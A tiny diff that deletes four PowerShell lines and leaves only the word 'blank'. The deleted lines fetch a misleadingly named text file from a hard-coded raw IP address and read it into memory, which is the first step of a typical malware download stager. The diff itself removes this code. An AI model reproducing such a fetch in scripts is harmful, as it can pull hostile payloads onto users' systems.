@@ -1,4 +1,1 @@
-$WebRequest = [System.Net.WebRequest]::Create("http://5.133.11.174/LICENSESES.txt");
-$WebRequest.Method = "Get";
-$ReadStream = New-Object System.IO.StreamReader $WebRequest.GetResponse().GetResponseStream();
-$Data=$ReadStream.ReadToEnd();
+blank
